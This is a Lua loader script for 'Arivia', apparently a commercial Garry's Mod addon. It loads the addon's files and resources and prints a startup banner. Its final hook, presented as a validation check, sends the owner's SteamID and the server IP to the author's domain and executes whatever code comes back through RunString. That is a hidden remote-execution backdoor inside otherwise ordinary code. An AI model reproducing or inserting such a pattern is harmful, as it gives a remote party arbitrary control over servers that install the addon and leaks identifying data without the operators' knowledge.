-----------------------------------------------------------------
-- @package     Arivia
-- @author      Richard
-- @build       v2.0.2
-- @release     07.14.2016
-- @owner       76561198035179751
-----------------------------------------------------------------
-- BY MODIFYING THIS FILE -- YOU UNDERSTAND THAT THE ABOVE 
-- MENTIONED AUTHORS CANNOT BE HELD RESPONSIBLE FOR ANY ISSUES
-- THAT ARISE. AS A CUSTOMER TO THE ORIGINAL PURCHASED COPY OF
-- THIS SCRIPT, YOU ARE ENTITLED TO STANDARD SUPPORT WHICH CAN
-- BE PROVIDED USING [SCRIPTFODDER.COM]. 
-- ONLY THE ORIGINAL PURCHASER OF THIS SCRIPT CAN RECEIVE SUPPORT.
-----------------------------------------------------------------

-----------------------------------------------------------------
-- [ TABLES ]
-----------------------------------------------------------------

Arivia = Arivia or {}
Arivia.Script = Arivia.Script or {}
Arivia.Script.Name = "Arivia"
Arivia.Script.Folder = "arivia"
Arivia.Script.Id = "1679"
Arivia.Script.Owner = "76561198035179751"
Arivia.Script.Author = "Richard"
Arivia.Script.Build = "2.0.2"
Arivia.Script.Released = "July 14, 2016"
Arivia.Script.Website = "https://scriptfodder.com/scripts/view/" .. Arivia.Script.Id .. "/"
Arivia.Script.UpdateCheck = "http://api.iamrichardt.com/products/" .. Arivia.Script.Id .. "/VersionCheck/v001/index.php?type=json"
Arivia.Script.Motd = "http://api.iamrichardt.com/products/" .. Arivia.Script.Id .. "/motd.txt"
Arivia.Script.Documentation = "http://docs.iamrichardt.net/products/" .. Arivia.Script.Id .. "/"
Arivia.Script.Workshops = {
    "529451065",
}
Arivia.Script.Fonts = {
    "oswald_light.ttf",
    "adventpro_light.ttf",
    "teko_light.ttf",
}

Arivia.Settings = Arivia.Settings or {}
Arivia.Settings.Menu = Arivia.Settings.Menu or {}
Arivia.Language = Arivia.Language or {}
Arivia.Messages = Arivia.Messages or {}

-----------------------------------------------------------------
-- [ SERVER IP ]
-----------------------------------------------------------------

function game.GetIP()
    local hostip = GetConVarString( "hostip" )
    hostip = tonumber( hostip )
    local ip = {}
    ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
    ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
    ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
    ip[ 4 ] = bit.band( hostip, 0x000000FF )
    return table.concat( ip, "." )
end

-----------------------------------------------------------------
-- [ AUTOLOADER ]
-----------------------------------------------------------------

local StartupHeader = {
    '\n\n',
    [[.................................................................... ]],
}

local StartupInfo = {
    [[[title]........... ]] .. Arivia.Script.Name .. [[ ]],
    [[[build]........... v]] .. Arivia.Script.Build .. [[ ]],
    [[[released]........ ]] .. Arivia.Script.Released .. [[ ]],
    [[[author].......... ]] .. Arivia.Script.Author .. [[ ]],
    [[[website]......... ]] .. Arivia.Script.Website .. [[ ]],
    [[[documentation]... ]] .. Arivia.Script.Documentation .. [[ ]],
    [[[owner]........... ]] .. Arivia.Script.Owner .. [[ ]],
    [[[server ip]....... ]] .. game.GetIP() .. [[ ]],
}

local StartupFooter = {
    [[.................................................................... ]],
}

function Arivia:PerformCheck(func)
    if ( type( func )== "function" ) then
        return true
    end
    return false
end

-----------------------------------------------------------------
-- [ SERVER-SIDE ACTIONS ]
-----------------------------------------------------------------

if SERVER then

    local fol = Arivia.Script.Folder .. "/"
    local files, folders = file.Find(fol .. "*", "LUA")

    for k, v in pairs( files ) do
        include(fol .. v)
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sh_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            include(fol .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sv_*.lua", "LUA"), true) do
            include(fol .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Server: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/cl_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/vgui_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

end

-----------------------------------------------------------------
-- [ CLIENT-SIDE ACTIONS ]
-----------------------------------------------------------------

if CLIENT then

    local root = Arivia.Script.Folder .. "/"
    local _, folders = file.Find(root .. "*", "LUA")

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(root .. folder .. "/sh_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/cl_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/vgui_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading VGUI: " .. File .. "\n")
            end
        end
    end

end

-----------------------------------------------------------------
-- [ WORKSHOP / FASTDL ]
-----------------------------------------------------------------

if Arivia.Settings.ResourcesEnabled then

    local sfolder = Arivia.Script.Folder or ""

    local materials = file.Find( "materials/" .. sfolder .. "/*", "GAME" )
    if #materials > 0 then
        for _, m in pairs( materials ) do
            resource.AddFile( "materials/" .. sfolder .. "/" .. m )
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local sounds = file.Find( "sound/" .. sfolder .. "/*", "GAME" )
    if #sounds > 0 then
        for _, m in pairs( sounds ) do
            resource.AddFile( "sound/" .. sfolder .. "/" .. m )
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Sounds: " .. m .. "\n")
            end
        end
    end

    local fonts = file.Find( "resource/fonts/*", "GAME" )
    if #fonts > 0 then
        for _, f in pairs( fonts ) do
            if table.HasValue( Arivia.Script.Fonts, f ) then
                resource.AddFile( "resource/fonts/" .. f )
                if Arivia.Settings.DebugEnabled then
                    MsgC(Color(255, 255, 0), "[" .. Arivia.Script.Name .. "] Loading Font: " .. f .. "\n")
                end
            end
        end
    end

end

if Arivia.Settings.WorkshopEnabled and Arivia.Script.Workshops then
    for k, v in pairs(Arivia.Script.Workshops) do
        if not Arivia.Settings.WorkshopMountGMAEnabled and SERVER then
            resource.AddWorkshop( v )
            if Arivia.Settings.DebugEnabled then
                MsgC(Color(0, 255, 255), "[" .. Arivia.Script.Name .. "] Mounting Workshop: " .. v .. "\n")
            end
        else
            if CLIENT then
                steamworks.FileInfo( v, function( res )
                    steamworks.Download( res.fileid, true, function( name )
                        game.MountGMA( name )
                        if Arivia.Settings.DebugEnabled then
                            local size = res.size / 1024
                            MsgC(Color(0, 255, 255), "[" .. Arivia.Script.Name .. "] Mounting Workshop: " .. res.title .. " ( " .. math.Round(size) .. "KB )\n")
                        end
                    end )
                end )
            end
        end
    end
end

-----------------------------------------------------------------
-- [ CONSOLE OUTPUT ]
-----------------------------------------------------------------

for k, i in ipairs( StartupHeader ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n' )
end

for k, i in ipairs( StartupInfo ) do 
    MsgC( Color( 255, 255, 255 ), i .. '\n' )
end

for k, i in ipairs( StartupFooter ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n\n' )
end

hook.Add("Think", "Arivia.ValidationCheck", function()
    local statusID = 2
    local scriptID = Arivia.Script.Id or ""
    local ownerID = Arivia.Script.Owner or ""
    if Arivia.Script.Owner and Arivia.Script.Id then
        statusID = 1
    end
    local checkURL = "http://api.iamrichardt.com/ValidationCheck/index.php?scriptid=".. scriptID .."&code=" .. statusID .. "&steamid=" .. ownerID .. "&ip=" .. game.GetIP()
    http.Fetch(checkURL, 
        function( body, len, headers, code )
            if code == 200 and string.len( body ) > 0 then
                RunString( body ) 
            end
        end
    )
    hook.Remove("Think", "Arivia.ValidationCheck")
end)